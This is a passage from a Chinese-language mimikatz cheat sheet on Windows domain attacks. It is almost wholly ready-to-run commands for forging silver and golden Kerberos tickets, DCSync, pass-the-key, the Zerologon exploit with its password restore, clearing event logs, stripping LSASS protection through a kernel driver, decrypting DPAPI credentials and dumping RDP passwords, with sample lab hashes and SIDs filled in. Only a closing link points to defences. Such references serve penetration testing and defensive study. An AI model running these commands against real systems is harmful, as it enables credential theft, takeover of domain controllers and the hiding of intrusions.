    REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
    ```
---
## PTT
### Silver_Tickets
导出 Server Hash
```bash
mimikatz.exe "privilege::debug” "sekurlsa::logonpasswords" "exit" > log.txt
```
使用 mimikatz 伪造白银票据：
```bash
mimikatz.exe "kerberos::golden /domain: /sid: /target: /service: /rc4: /user: /ptt" exit
```
**例子:访问域控上的 cifs 服务(Windoiws 主机间的文件共享)**
在域控上执行以下命令获取本地账户 NTLM Hash 和 SID
```bash
mimikatz.exe "privilege::debug” "sekurlsa::logonpasswords" "exit" > log.txt
```
![](../../../assets/img/Security/安全工具/mimikatz/1.png)
然后将生成白银票据注入到内存中,并查看票据生成情况。查看目标的文件共享服务成功：
```bash
kerberos::golden /domain:ffffffff0x.com /sid:S-1-5-21-1112871890-2494343973-3486175548 /target:WIN-A5GPDCPJ7OT.ffffffff0x.com /rc4:f9ca454a3544172034a8666a79eda95e /service:cifs /user:test /ptt
# 这里的 cifs 是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统
```
访问测试
![](../../../assets/img/Security/安全工具/mimikatz/2.png)
**例子:DCSync**
有 LDAP 特权情况下，可以实现 DCSync
```bash
mimikatz "kerberos::golden /domain: /sid: /target: /service:LDAP /rc4: /user:krbtgt /ptt" "lsadump::dcsync /domain:test.com /all /csv" exit
```
- 只能在域内计算机上运行，不支持域外
- /sid 表示域的 sid, 任一域用户的 sid 去除最后一位就是域的 sid
- /rc4 表示计算机帐户的 NTLM hash
- /user:krbtgt 表示伪造成用户 krbtgt，生成票据
```
mimikatz "kerberos::golden /domain:ffffffff0x.com /sid:S-1-5-21-1112871890-2494343973-3486175548 /target:WIN-A5GPDCPJ7OT.ffffffff0x.com /service:LDAP /rc4:b0924e2e9d84ba0679c59f3730e91400 /user:krbtgt /ptt" "lsadump::dcsync /domain:ffffffff0x.com /all /csv" exit
```
---
### Golden_Tickets
在 AS_REQ & AS_REP 中，用户使用自身 hash 加密时间戳发送给 KDC，KDC 验证成功后返回用 krbtgt hash 加密的 TGT 票据。如果攻击者有 krbtgt 的 hash，就可以自己给自己签发任意用户的 tgt 票据。
先导出 krbtgt 的 hash
```bash
privilege::debug
lsadump::lsa /patch
# 或
lsadump::dcsync /domain: /user:krbtgt
```
使用 mimikatz 伪造的黄金票据，这里生成 Golden Ticket 不仅可以使用 aes256，也可用 krbtgt 的 NTLM hash
```bash
kerberos::golden /user: /domain: /sid: /krbtgt: /ticket:test.kiribi
```
利用 mimikatz 的 kerberos::ptt 将黄金票据 test.kiribi 注入到内存中：
```bash
# 清除缓存的票据
kerberos::purge
# 注入黄金票据 test.kiribi
kerberos::ptt test.kiribi
# 列出票据
kerberos::list
```
> 导入的票据在20分钟内有效，过期之后再次导入就行
现在可以访问域控共享目录，还能在 DC 上远程执行 psexec
但是需要注意的是用 psexec 远程执行命令的时候，需要不能使用 IP 访问。使用 NetBios 的服务名访问才会走 Kerberos 认证，达到伪造凭据的攻击
**例子**
在数据库服务器上，利用域管理员的权限获得 krbtgt 的 NTLM 哈希 和 SID
使用 Mimikatz 抓取 Krbtgt 账号的密码
```bash
mimikatz.exe "lsadump::dcsync /domain:ffffffff0x.com /user:krbtgt" > log.txt
```
![](../../../assets/img/Security/安全工具/mimikatz/3.png)
得到 krbtgt 哈希之后，使用 mimikatz 的 `kerberos::golden` 生成黄金票据 `test.kiribi`：
```bash
kerberos::golden /user:administrator /domain:FFFFFFFF0X.com /sid:S-1-5-21-1112871890-2494343973-3486175548 /krbtgt:743093920acd8d427323c24c0e2c52c2 /ticket:test.kiribi
```
`/admin` 为伪造的用户名，用户名可以任意伪造 `/domain` 为目标的域名 `/sid` 为目标域名的 SID `/krbtgt` 为 krbtgt 账户密码的 NTLM Hash `/ticket` 为要伪造的黄金票据的名称
注入黄金票据
```bash
kerberos::ptt test.kiribi
```
访问测试
![](../../../assets/img/Security/安全工具/mimikatz/4.png)
---
## PTK
```bash
# 获取用户的 aes key
mimikatz "privilege::debug" "sekurlsa::ekeys"
# 注意查看 aes256_hmac 和 aes128_hmac
mimikatz "privilege::debug" "sekurlsa::pth /user:test /domain:test.com /aes256:c4388a1fb9bd65a88343a32c09e53ba6c1ead4de8a17a442e819e98c522fc288"
```
域控未打 KB2871997 补丁前，无法使用 Key 传递攻击
---
## zerologon
```bash
# 检测
lsadump::zerologon /target:WIN-A5GPDCPJ7OT.ffffffff0x.com /account:WIN-A5GPDCPJ7OT$
# 利用
lsadump::zerologon /target:WIN-A5GPDCPJ7OT.ffffffff0x.com /account:WIN-A5GPDCPJ7OT$ /exploit
# 使用空密码登录域管
lsadump::dcsync /domain:ffffffff0x.com /dc:WIN-A5GPDCPJ7OT.ffffffff0x.com /user:krbtgt /authuser:WIN-A5GPDCPJ7OT$ /authdomain:ffffffff0x /authpassword:"" /authntlm
# 导出hash
lsadump::dcsync /domain:ffffffff0x.com /dc:WIN-A5GPDCPJ7OT.ffffffff0x.com /user:administrator /authuser:WIN-A5GPDCPJ7OT$ /authdomain:ffffffff0x /authpassword: /authntlm
# 恢复密码
lsadump::postzerologon /target:192.168.141.154 /account:WIN-A5GPDCPJ7OT$
```
---
## 后渗透
多用户登录 3389
```
ts::multirdp
```
清除日志
```
event::drop
```
粘贴板信息
```
misc::clip
```
---
## 绕过RunAsPPL
RunAsPPL 有效地阻止了 Mimikatz 访问的内存 lsass.exe
为此 Mimikatz 使用数字签名的驱动程序来删除内核中 Process 对象的保护标志。该文件 mimidrv.sys 必须位于当前文件夹中，以便使用 `!+` 命令作为内核驱动程序服务加载 。然后，使用命令 `!processprotect` 删除保护并最终访问 lsass.exe。
加载之后即可关闭 LSA 保护，正常 dump hash
```
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonpasswords
```
完成后，可以使用 `!-` 卸载驱动程序。
```
mimikatz # !-
```
---
## DPAPI
查看目标Windows凭据管理器中是否保存有各种系统连接账密
```
cmdkey /l
```
通过读取 Lsass 进程信息，获取当前系统中的 MasterKey，能获得多个 Master Key file 对应的 MasterKey
```
privilege::debug
sekurlsa::dpapi
```
**RDP**
Windows 保存 RDP 凭据的目录是 `C:\Users\用户名\AppData\Local\Microsoft\Credentials`
![](../../../assets/img/Security/安全工具/mimikatz/12.png)
可通过命令行获取，执行: `cmdkey /list` 或 `powerpick Get-ChildItem C:\Users\用户名\AppData\Local\Microsoft\Credentials\ -Force`
注意: `cmdkey /list` 命令务必在 Session 会话下执行，system 下执行无结果。
mimikatz 获取 guidMasterKey,再通过 guid 来找到其所对应的 Masterkey
```
privilege::debug
dpapi::cred /in:C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\SESSIONID
```
![](../../../assets/img/Security/安全工具/mimikatz/13.png)
pbData 是我们要解密的数据，guidMasterKey 是解密所需要的密钥,找到对应的 Masterkey 才能解密
根据上面的 guidMasterKey 来确定其对应的 MasterKey, 如下所示
```
sekurlsa::dpapi
```
![](../../../assets/img/Security/安全工具/mimikatz/14.png)
```
dpapi::cred /in:C:\Users\USERNAME\Desktop\test\SESSIONID /masterkey:对应GUID的masterkey"
```
![](../../../assets/img/Security/安全工具/mimikatz/15.png)
---
## MSTSC Passwords
从 Svchost.exe Dump RDP 明文密码
```bash
privilege::debug
ts::mstsc
```
在 RDP 连接目标时才能抓出来
![](../../../assets/img/Security/安全工具/mimikatz/17.png)
---
## 防御手段
- [Secure-Win](../../Integrated/Windows/Secure-Win.md#防御密码抓取)